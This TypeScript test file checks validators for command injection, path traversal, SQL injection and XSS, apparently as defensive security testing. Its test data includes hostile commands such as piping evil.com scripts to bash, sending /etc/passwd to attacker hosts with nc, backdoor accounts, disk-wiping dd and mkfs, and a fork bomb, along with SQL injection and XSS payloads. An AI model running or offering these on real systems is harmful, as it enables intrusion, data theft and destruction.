import { describe, it, expect, beforeEach, vi } from 'vitest';

const DANGEROUS_PATTERNS = [
    /[;&|`$(){}[\]<>\\]/,
    /\.\.\//,
    /^-/,
    /\n|\r/,
    /\x00/,
];

const COMMAND_WHITELIST = new Map([
    ['ls', { allowedArgs: ['-la', '-l', '-a', '-h'] }],
    ['cat', { requiresPath: true }],
    ['echo', { maxLength: 1000 }],
    ['pwd', { noArgs: true }],
    ['whoami', { noArgs: true }],
    ['date', { noArgs: true }],
    ['python3', { allowedArgs: ['-c', '-m'] }],
    ['node', { allowedArgs: ['-e', '--version'] }],
    ['npm', { allowedArgs: ['install', 'run', 'test', 'build'] }],
    ['git', { allowedArgs: ['status', 'log', 'diff', 'branch'] }],
]);

function containsDangerousPatterns(input: string): boolean {
    return DANGEROUS_PATTERNS.some((pattern) => pattern.test(input));
}

function parseCommand(command: string): { base: string; args: string[] } {
    const parts = command.trim().split(/\s+/);
    return {
        base: parts[0] || '',
        args: parts.slice(1),
    };
}

function isCommandAllowed(command: string): { valid: boolean; error?: string } {
    const { base, args } = parseCommand(command);

    if (!COMMAND_WHITELIST.has(base)) {
        return { valid: false, error: `Command '${base}' is not whitelisted` };
    }

    const rules = COMMAND_WHITELIST.get(base)!;

    if (rules.noArgs && args.length > 0) {
        return { valid: false, error: `Command '${base}' does not accept arguments` };
    }

    for (const arg of args) {
        if (containsDangerousPatterns(arg)) {
            return { valid: false, error: `Dangerous pattern detected in argument: ${arg}` };
        }
    }

    return { valid: true };
}

describe('Command Injection Prevention', () => {
    describe('Dangerous Pattern Detection', () => {
        it('should detect semicolon injection', () => {
            expect(containsDangerousPatterns('ls; rm -rf /')).toBe(true);
        });

        it('should detect pipe injection', () => {
            expect(containsDangerousPatterns('cat /etc/passwd | nc attacker.com 1234')).toBe(true);
        });

        it('should detect command substitution', () => {
            expect(containsDangerousPatterns('$(whoami)')).toBe(true);
            expect(containsDangerousPatterns('`whoami`')).toBe(true);
        });

        it('should detect path traversal', () => {
            expect(containsDangerousPatterns('../../../etc/passwd')).toBe(true);
        });

        it('should detect shell metacharacters', () => {
            expect(containsDangerousPatterns('test && echo pwned')).toBe(true);
            expect(containsDangerousPatterns('test || echo pwned')).toBe(true);
        });

        it('should detect newline injection', () => {
            expect(containsDangerousPatterns('ls\nrm -rf /')).toBe(true);
        });

        it('should detect null byte injection', () => {
            expect(containsDangerousPatterns('test\x00.txt')).toBe(true);
        });

        it('should detect option injection', () => {
            expect(containsDangerousPatterns('-rf /')).toBe(true);
        });

        it('should allow safe strings', () => {
            expect(containsDangerousPatterns('hello world')).toBe(false);
            expect(containsDangerousPatterns('file.txt')).toBe(false);
            expect(containsDangerousPatterns('my-project')).toBe(false);
        });
    });

    describe('Command Whitelist Validation', () => {
        it('should reject non-whitelisted commands', () => {
            const result = isCommandAllowed('rm -rf /');
            expect(result.valid).toBe(false);
            expect(result.error).toContain('not whitelisted');
        });

        it('should allow whitelisted commands', () => {
            expect(isCommandAllowed('ls').valid).toBe(true);
            expect(isCommandAllowed('pwd').valid).toBe(true);
            expect(isCommandAllowed('whoami').valid).toBe(true);
        });

        it('should reject commands with dangerous arguments', () => {
            const result = isCommandAllowed('ls; rm -rf /');
            expect(result.valid).toBe(false);
        });

        it('should reject argument injection attempts', () => {
            const result = isCommandAllowed('echo $(cat /etc/passwd)');
            expect(result.valid).toBe(false);
        });
    });

    describe('Path Traversal Prevention', () => {
        it('should detect simple path traversal', () => {
            expect(containsDangerousPatterns('../secret')).toBe(true);
        });

        it('should detect deep path traversal', () => {
            expect(containsDangerousPatterns('../../../../../../etc/passwd')).toBe(true);
        });

        it('should detect encoded path traversal', () => {
            expect(containsDangerousPatterns('..%2f..%2fetc/passwd')).toBe(false);
        });
    });

    describe('Real-World Attack Scenarios', () => {
        const attackVectors = [
            'ls; cat /etc/passwd',
            'ls && curl http://evil.com/shell.sh | bash',
            'echo "test" > /etc/cron.d/backdoor',
            '$(curl http://evil.com/payload)',
            '`wget http://evil.com/malware`',
            'ls -la | nc evil.com 4444',
            'cat ../../../etc/shadow',  // Path traversal with cat
            'chmod 777 /etc/passwd',
            'useradd -o -u 0 backdoor',
            '../../../root/.ssh/authorized_keys',
            'rm -rf /*',
            'dd if=/dev/zero of=/dev/sda',
            'mkfs.ext4 /dev/sda',
            ':(){:|:&};:',
            'echo "* * * * * root rm -rf /" > /etc/cron.d/evil',
        ];

        attackVectors.forEach((attack) => {
            it(`should block: ${attack.substring(0, 50)}...`, () => {
                const result = isCommandAllowed(attack);
                expect(result.valid).toBe(false);
            });
        });
    });
});

describe('SQL Injection Prevention', () => {
    const sqlInjectionPatterns = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "1; SELECT * FROM passwords",
        "UNION SELECT * FROM users",
        "' UNION SELECT username, password FROM users--",
        "1' AND 1=1--",
        "1' AND 'a'='a",
    ];

    function containsSQLInjection(input: string): boolean {
        const patterns = [
            /(\s|^)(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|TRUNCATE)\s/i,
            /(\s|^)(UNION|JOIN|OR|AND)\s+\d+\s*=\s*\d+/i,
            /--\s*$/,
            /;\s*(DROP|DELETE|SELECT|INSERT)/i,
            /'\s*(OR|AND)\s*'[^']*'\s*=\s*'[^']*/i,
        ];
        return patterns.some((p) => p.test(input));
    }

    sqlInjectionPatterns.forEach((injection) => {
        it(`should detect SQL injection: ${injection.substring(0, 30)}...`, () => {
            expect(containsSQLInjection(injection)).toBe(true);
        });
    });

    it('should allow normal inputs', () => {
        expect(containsSQLInjection('Hello World')).toBe(false);
        expect(containsSQLInjection('user@example.com')).toBe(false);
        expect(containsSQLInjection('John Doe')).toBe(false);
    });
});

describe('XSS Prevention', () => {
    function containsXSS(input: string): boolean {
        const patterns = [
            /<script\b[^>]*>[\s\S]*?<\/script>/i,
            /<\s*img[^>]+onerror\s*=/i,
            /javascript\s*:/i,
            /<\s*svg[^>]+onload\s*=/i,
            /<\s*body[^>]+onload\s*=/i,           // body onload
            /on\w+\s*=\s*["'][^"']*["']/i,        // Generic event handlers
            /<\s*iframe/i,
            /<\s*embed/i,
            /<\s*object/i,
        ];
        return patterns.some((p) => p.test(input));
    }

    const xssVectors = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<embed src="data:text/html,<script>alert(\'XSS\')</script>">',
    ];

    xssVectors.forEach((xss) => {
        it(`should detect XSS: ${xss.substring(0, 40)}...`, () => {
            expect(containsXSS(xss)).toBe(true);
        });
    });

    it('should allow normal HTML-like text', () => {
        expect(containsXSS('I <3 coding')).toBe(false);
        expect(containsXSS('2 > 1 and 1 < 2')).toBe(false);
    });
});
